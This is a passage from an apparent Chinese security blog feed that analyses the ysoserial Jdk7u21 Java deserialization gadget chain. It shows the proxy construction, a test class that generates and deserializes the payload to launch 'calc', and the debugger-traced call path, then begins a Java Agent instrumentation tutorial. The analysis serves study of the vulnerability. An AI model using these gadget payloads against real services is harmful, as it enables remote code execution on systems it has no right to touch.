<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> Gadgets.createProxy(tempHandler, Templates.class);</span><br></pre></td></tr></table></figure>

<p>再来看到下一段代码,跟进一下<code>Gadgets.createProxy</code>方法，主要就最后一行，使用了<code>Templates</code>去做动态代理</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618184148530-1966438151.png" alt="image-20220618184148200"></p>
<p>等价于下面的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=cls.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        Templates templates=(Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(),Templates.class.getInterfaces(),invocationHandler);</span><br><span class="line">        Object object=constructor.newInstance(Override.class,templates);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着往下看</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618192149052-791127900.png" alt="image-20220618192148678"></p>
<p>实例化一个<code>LinkedHashSet</code>对象，并将<code>templates</code>和<code>proxy</code>添加进去。</p>
<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>先编写一个测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.Jdk7u21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jdk7u21</span>().getObject(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(calc);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化输出----&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>成功触发</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618192949304-242290566.png" alt="image-20220618192948825"></p>
<p>接下来分析下该利用链的具体调用过程，根据yso返回的是<code>LinkedHashSet</code>实例化对象，所以反序列化时先会调用<code>LinkedHashSet#readObject()</code>方法。</p>
<p>可以看到并没有<code>readObject()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618194947351-181087664.png" alt="image-20220618194946775"></p>
<p>查看下父类，发现继承了<code>HashSet</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618195104101-641953240.png" alt="image-20220618195103571"></p>
<p>那么会调用<code>HashSet#readObject()</code>方法，在里面打个断点，这里调用了<code>map.put()</code>方法，跟进一下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618202844926-1706817119.png" alt="image-20220618202844266"></p>
<p>发现调用的是<code>HashMap#put()</code>方法，这里有个for循环，因为table数组是空的所以并不会进入循环中，下面会调用<code>addEntry</code>,将这几个值添加进去，hash的值为hash方法处理<code>TemplatesImpl</code>的值，key为<code>TemplatesImpl</code>的实例对象，value则是一个空的Object对象，i参数为<code>indexFor</code>方法处理hash后的结果。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618203844306-1455246806.png" alt="image-20220618203843843"></p>
<p>返回之后，继续调用put方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204410694-552579046.png" alt="image-20220618204410352"></p>
<p>此时table中有了值，所以进入for循环</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204601345-924320972.png" alt="image-20220618204600793"></p>
<p>这里的key为代理类，代理类执行方法时，会触发<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法执行</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618204744583-1951323441.png" alt="image-20220618204744027"></p>
<p>这里通过if判断后，会调用<code>equalsImpl()</code>方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618205445366-690404709.png" alt="image-20220618205444743"></p>
<p>进入方法中，可以看到这里会通过反射调用 <code>var1</code> 对象的 <code>var5</code> 方法，此时<code>var1</code>为<code>TemplatesImpl</code>，<code>var5</code>是名为<code>newTransformer</code>的<code>Method</code>对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618211236797-637088163.png" alt="image-20220618211236270"></p>
<p>那么这里是怎么获取var5的呢，可以看到上面通过<code>getMemberMethods()</code>方法拿到Method类类型的数组，跟进这个方法看一下。通过反射拿到this.type对象的方法，这里的type为<code>templates</code>对象</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618211429646-1493626930.png" alt="image-20220618211429288"></p>
<p>这里返回了两个方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618221119175-668285203.png" alt="image-20220618221118759"></p>
<p>然后拿到这两个方法之后，就会进入for循环，通过<code>var8 = var5.invoke(var1);</code>分别通过反射调用这两个方法，var1就是<code>TemplatesImpl</code>的实例对象。也就是说会调用<code>TemplatesImpl#getOutputProperties()</code>方法，后面的调用步骤和走之前CC链利用<code>TemplatesImpl</code>构造恶意类的调用时一样的。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618212154096-356263688.png" alt="image-20220618212153754"></p>
<p>往下就是之前<code>TemplatesImpl</code>的调用链了，<code>getOutputProperties</code>方法会去调用<code>newTransformer</code>方法，<code>newTransformer</code>又会去调用<code>getTransletInstance</code>方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220618212439063-180962652.png" alt="image-20220618212438318"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/14026849.html">https://www.cnblogs.com/nice0e3/p/14026849.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Java Agent</title>
    <url>/2022/06/19/Java%E5%AE%89%E5%85%A8%E4%B9%8BJava-Agent/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="Java-Agent简介"><a href="#Java-Agent简介" class="headerlink" title="Java Agent简介"></a>Java Agent简介</h3><p>JavaAgent 是 JDK1.5 之后引入的新特性，此特性为用户提供了在 JVM 将字节码文件读入内存之后，JVM 使用对应的字节流在 Java 堆中生成一个 Class 对象之前，用户可以对其字节码进行修改的能力，从而 JVM 也将会使用用户修改过之后的字节码进行 Class 对象的创建。Java Agent可以去实现字节码插桩、动态跟踪分析等。</p>
<span id="more"></span>

<h3 id="Java-Agent运行模式"><a href="#Java-Agent运行模式" class="headerlink" title="Java Agent运行模式"></a>Java Agent运行模式</h3><p>共两种运行模式：</p>
<ol>
<li>启动Java程序时添加<code>-javaagent(Instrumentation API实现方式)</code>或<code>-agentpath/-agentlib(JVMTI的实现方式)</code>参数；</li>
<li>在1.6版本新增了attach(附加方式)方式，可以对运行中的<code>Java进程</code>插入<code>Agent</code>；</li>
</ol>
<p>方式一中要在启动前去指定需要加载的Agent文件，而方式二可以在Java程序运行后根据进程ID进行动态注入Agent到JVM里面去。</p>
<h3 id="Java-Agent概念"><a href="#Java-Agent概念" class="headerlink" title="Java Agent概念"></a>Java Agent概念</h3><p>Javaagent是java命令的一个参数。参数javaagent可以用于指定一个jar包，并且对该jar包有2个要求：</p>
<ol>
<li>这个jar包的MANIFEST.MF文件必须指定Premain-Class项。</li>
<li>Premain-Class指定的那个类必须实现premain()方法。</li>
</ol>
<p>premain 方法，从字面上理解，就是运行在 main 函数之前的的类。当Java虚拟机启动时，在执行 main 函数之前，JVM会先运行-javaagent所指定jar包内Premain-Class这个类的premain方法 。普通的Java类是以main方法作为程序入口点，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口。</p>
<p>在命令行输入java可以看到相应的参数，其中有和java agent相关的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-agentlib:&lt;libname&gt;[=&lt;选项&gt;] 加载本机代理库 &lt;libname&gt;, 例如 -agentlib:hprof</span><br><span class="line">	另请参阅 -agentlib:jdwp=help 和 -agentlib:hprof=help</span><br><span class="line">-agentpath:&lt;pathname&gt;[=&lt;选项&gt;]</span><br><span class="line">	按完整路径名加载本机代理库</span><br><span class="line">-javaagent:&lt;jarpath&gt;[=&lt;选项&gt;]</span><br><span class="line">	加载 Java 编程语言代理, 请参阅 java.lang.instrument</span><br></pre></td></tr></table></figure>

<p>在上面<code>-javaagent</code>参数中提到了参阅<code>java.lang.instrument</code>，这是在<code>rt.jar</code>中定义的一个包，该路径下有两个重要的类：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619221439654-986889165.png" alt="image-20220619221436767"></p>
<p>该包提供了一些工具帮助开发人员在 Java 程序运行时，动态修改系统中的 Class 类型。其中，使用该软件包的一个关键组件就是 Javaagent。从名字上看，似乎是个 Java 代理之类的，而实际上，他的功能更像是一个Class 类型的转换器，他可以在运行时重新接受外部请求，对Class类型进行修改。</p>
<p>从本质上讲，Java Agent 是一个遵循一组严格约定的常规 Java 类。 上面说到 javaagent命令要求指定的类中必须要有premain()方法，并且对premain方法的签名也有要求，签名必须满足以下两种格式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure>

<p>JVM 会优先加载 带<code>Instrumentation</code>签名的方法，加载成功忽略第二种，如果第一种没有，则加载第二种方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619221939998-233521183.png" alt="image-20220619221937740"></p>
<h3 id="Instrumentation接口"><a href="#Instrumentation接口" class="headerlink" title="Instrumentation接口"></a>Instrumentation接口</h3><p>接口中的方法描述大致如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line">	<span class="comment">//检测是否允许reTransformer</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRetransformClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isRedefineClassesSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//传入字节码，可以重新定义类</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span></span><br><span class="line">        <span class="keyword">throws</span>  ClassNotFoundException, UnmodifiableClassException;</span><br><span class="line">	<span class="comment">//类是否支持reTransformer</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line">	<span class="comment">//获取所有已经加载的类</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">  	<span class="comment">//获取类加载器下所有已经初始化的类</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getInitiatedClasses(ClassLoader loader);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取一个对象的大小</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToBootstrapClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">appendToSystemClassLoaderSearch</span><span class="params">(JarFile jarfile)</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isNativeMethodPrefixSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setNativeMethodPrefix</span><span class="params">(ClassFileTransformer transformer, String prefix)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ClassFileTransformer接口"><a href="#ClassFileTransformer接口" class="headerlink" title="ClassFileTransformer接口"></a>ClassFileTransformer接口</h3><p><code>java.lang.instrument.ClassFileTransformer</code>是一个转换类文件的代理接口，我们可以在获取到<code>Instrumentation</code>对象后通过<code>addTransformer</code>方法添加自定义类文件转换器。当有新的类被<code>JVM</code>加载时，<code>JVM</code>会自动回调用我们自定义的<code>Transformer</code>类的<code>transform</code>方法，传入该类的<code>transform</code>信息(<code>类名、类加载器、类字节码</code>等)，我们可以根据传入的类信息决定是否需要修改类字节码，修改完字节码后我们将新的类字节码返回给<code>JVM</code>，<code>JVM</code>会验证类和相应的修改是否合法，如果符合类加载要求<code>JVM</code>会加载我们修改后的类字节码。</p>
<p>查看一下该接口</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619223904902-413210652.png" alt="image-20220619223902779"></p>
<p>只有一个<code>transform</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader loader              	定义要转换的类加载器；如果是引导加载器，则为 <span class="literal">null</span></span><br><span class="line">String   className           		加载的类名,如:java/lang/Runtime</span><br><span class="line">Class&lt;?&gt; classBeingRedefined 		如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 <span class="literal">null</span></span><br><span class="line">ProtectionDomain protectionDomain   要定义或重定义的类的保护域</span><br><span class="line"><span class="type">byte</span>[]  classfileBuffer     		类文件格式的输入字节缓冲区（不得修改）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重写**<code>transform</code>**方法注意事项：</p>
<ol>
<li><code>ClassLoader</code>如果是被<code>Bootstrap ClassLoader(引导类加载器)</code>所加载那么<code>loader</code>参数的值是空。</li>
<li>修改类字节码时需要特别注意插入的代码在对应的<code>ClassLoader</code>中可以正确的获取到，否则会报<code>ClassNotFoundException</code>，比如修改<code>java.io.FileInputStream(该类由Bootstrap ClassLoader加载)</code>时插入了我们检测代码，那么我们将必须保证<code>FileInputStream</code>能够获取到我们的检测代码类。</li>
<li><code>JVM</code>类名的书写方式路径方式：<code>java/lang/String</code>而不是我们常用的类名方式：<code>java.lang.String</code>。</li>
<li>类字节必须符合<code>JVM</code>校验要求，如果无法验证类字节码会导致<code>JVM</code>崩溃或者<code>VerifyError(类验证错误)</code>。</li>
<li>如果修改的是<code>retransform</code>类(修改已被<code>JVM</code>加载的类)，修改后的类字节码不得<code>新增方法</code>、<code>修改方法参数</code>、<code>类成员变量</code>。</li>
<li><code>addTransformer</code>时如果没有传入<code>retransform</code>参数(默认是<code>false</code>)就算<code>MANIFEST.MF</code>中配置了<code>Can-Redefine-Classes: true</code>而且手动调用了<code>retransformClasses</code>方法也一样无法<code>retransform</code>。</li>
<li>卸载<code>transform</code>时需要使用创建时的<code>Instrumentation</code>实例。</li>
</ol>
<h3 id="Java-Agent实现"><a href="#Java-Agent实现" class="headerlink" title="Java Agent实现"></a>Java Agent实现</h3><p>使用<code>javaagent</code>需要几个步骤：</p>
<ol>
<li>定义一个 MANIFEST.MF 文件，必须包含 Premain-Class 选项，通常也会加入Can-Redefine-Classes 和 Can-Retransform-Classes 选项。</li>
<li>创建一个Premain-Class 指定的类，类中包含 premain 方法，方法逻辑由用户自己确定。</li>
<li>将 premain 的类和 MANIFEST.MF 文件打成 jar 包。</li>
<li>使用参数 -javaagent: jar包路径 启动要代理的方法。</li>
</ol>
<p>实现javaagent你需要搭建两个工程，一个工程是用来承载javaagent类，单独的打成jar包；一个工程是javaagent需要去代理的类。</p>
<h4 id="JVM启动前运行"><a href="#JVM启动前运行" class="headerlink" title="JVM启动前运行"></a>JVM启动前运行</h4><p>工程目录结构如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">├── java</span><br><span class="line">│   └── org</span><br><span class="line">│       └── agent</span><br><span class="line">│           ├── Agent.java</span><br><span class="line">└── resources</span><br><span class="line">    └── META-INF</span><br><span class="line">        ├── MANIFEST.MF</span><br></pre></td></tr></table></figure>

<p>创建一个包含premain方法的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.agent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Agent args is : &quot;</span> + args);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;premain load class&quot;</span> + className);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面就是我实现的一个类，实现了带Instrumentation参数的premain()方法。调用addTransformer()方法对启动时所有的类进行拦截。</p>
<p>然后在 resources 目录下新建目录：META-INF，在该目录下新建文件：MANIFREST.MF：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Can-Redefine-Classes: <span class="literal">true</span></span><br><span class="line">Can-Retransform-Classes: <span class="literal">true</span></span><br><span class="line">Premain-Class: org.agent.Agent</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>MANIFREST.MF文件的作用</p>
</blockquote>
<p>Premain-Class ：包含 premain 方法的类（类的全路径名）</p>
<p>Agent-Class ：包含 agentmain 方法的类（类的全路径名）</p>
<p>Boot-Class-Path ：设置引导类加载器搜索的路径列表。查找类的特定于平台的机制失败后，引导类加载器会搜索这些路径。按列出的顺序搜索路径。列表中的路径由一个或多个空格分开。路径使用分层 URI 的路径组件语法。如果该路径以斜杠字符（“&#x2F;”）开头，则为绝对路径，否则为相对路径。相对路径根据代理 JAR 文件的绝对路径解析。忽略格式不正确的路径和不存在的路径。如果代理是在 VM 启动之后某一时刻启动的，则忽略不表示 JAR 文件的路径。（可选）</p>
<p>Can-Redefine-Classes ：true表示能重定义此代理所需的类，默认值为 false（可选）</p>
<p>Can-Retransform-Classes ：true 表示能重转换此代理所需的类，默认值为 false （可选）</p>
<p>Can-Set-Native-Method-Prefix： true表示能设置此代理所需的本机方法前缀，默认值为 false（可选）</p>
<p>即在该文件中主要定义了程序运行相关的配置信息，程序运行前会先检测该文件中的配置项。</p>
<p>也可以用maven去配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                      <span class="comment">&lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Premain-Class</span>&gt;</span>com.nice0e3.Agent<span class="tag">&lt;/<span class="name">Premain-Class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>com.nice0e3.Agent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">source</span>&gt;</span>6<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">target</span>&gt;</span>6<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译成jar包后，再建立一个项目，配置加入-javaagent参数，<code>-javaagent:out\Agent1-1.0-SNAPSHOT.jar</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619233354128-1398045893.png" alt="image-20220619233353379"></p>
<p>编写一个main方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main start&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;main end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果，这里可以看到打印了JVM加载的所有类。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220619233501677-2145241489.png" alt="image-20220619233501086"></p>
<p>上面的输出结果我们能够发现：</p>
<ol>
<li>执行main方法之前会加载所有的类，包括系统类和自定义类；</li>
<li>在ClassFileTransformer中会去拦截系统类和自己实现的类对象；</li>
<li>如果你有对某些类对象进行改写，那么在拦截的时候抓住该类使用字节码编译工具即可实现。</li>
</ol>
<h5 id="transform测试"><a href="#transform测试" class="headerlink" title="transform测试"></a>transform测试</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> rickiyang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2019-08-06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Desc</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(<span class="keyword">final</span> ClassLoader loader, <span class="keyword">final</span> String className, <span class="keyword">final</span> Class&lt;?&gt; classBeingRedefined,<span class="keyword">final</span> ProtectionDomain protectionDomain, <span class="keyword">final</span> <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="comment">// 操作Date类</span></span><br><span class="line">        <span class="keyword">if</span> (<span 